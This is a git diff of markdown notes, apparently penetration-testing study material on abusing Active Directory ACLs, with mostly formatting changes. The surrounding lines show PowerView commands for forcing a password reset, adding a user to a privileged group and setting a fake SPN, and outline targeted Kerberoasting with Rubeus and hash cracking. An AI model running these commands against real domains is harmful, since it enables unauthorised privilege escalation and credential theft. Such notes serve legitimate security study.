@@ -193,6 +193,7 @@ Set-DomainObject -credential $Cred -Identity ttimmons -SET @{serviceprincipalnam
 ## ACL
 ### ACL Rights & What They Mean 
 GenericRight - all possible access rights 
+
 GenericWrite - full write access
 ```
 Find-InterestingDomainACL
@@ -219,7 +220,10 @@ cd Tools
 Impot-Module .\Powerview.ps1 
 Set-DomainUserPassword -Identity target-user -AccountPassword $target-user-password -Credentials $Cred -Verbose
 ```
-## Adding Target User To Privileged Group 
+### Adding Target User To Privileged Group 
+[!NOTE]  
+> What all is required to make this possible?
+> Process: Create fake SPN -> Use rubeus.exe -> crack hashes -> cleanu
 **Step 1** 
 ```
 $SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
@@ -234,7 +238,7 @@ Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Creden
 
 ```
 ### Creating fake SPN 
- [!NOTE]  
+[!NOTE]  
 > Must be authenticated as member of group to be successful. 
 > Process: Create fake SPN -> Use rubeus.exe -> crack hashes -> cleanup 
 
